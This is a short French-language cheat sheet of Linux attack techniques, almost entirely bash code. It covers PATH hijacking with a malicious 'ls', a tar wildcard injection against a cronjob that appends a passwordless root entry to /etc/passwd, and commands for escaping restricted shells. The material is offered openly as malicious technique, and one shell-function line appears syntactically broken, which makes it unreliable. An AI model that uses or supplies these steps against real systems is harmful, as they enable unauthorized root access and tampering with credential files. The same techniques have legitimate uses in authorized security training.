### PATH Abuse
> Manipuler le PATH pour faire exécuter notre code malveillant au lieu des binaires légitimes
```bash
# Ajouter . au PATH
PATH=.:$PATH
export PATH

# Créer un binaire malveillant 
echo 'echo "PATH ABUSE!!"; /bin/bash' > ls
chmod +x ls
ls  # Execute notre code au lieu de la commande ls
```
### Wildcard Abuse
> Abuser des caractères jokers (*,?,[]) dans les scripts, souvent utilisés avec tar

```bash
# Exploiter un cronjob utilisant tar avec wildcard (*)
echo 'echo "root::" >> /etc/passwd' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
# Attendre que le cronjob s'exécute
```

### Restricted Shell Escape
> Techniques pour s'échapper d'un shell restreint (rbash, rksh, rzsh)

```bash
# Command substitution
ls -l `pwd`

# Command chaining
ls;/bin/bash

# Using environment variables
SHELL=/bin/bash exec /bin/bash

# Using shell functions
function() { /bin/bash; }; function
```
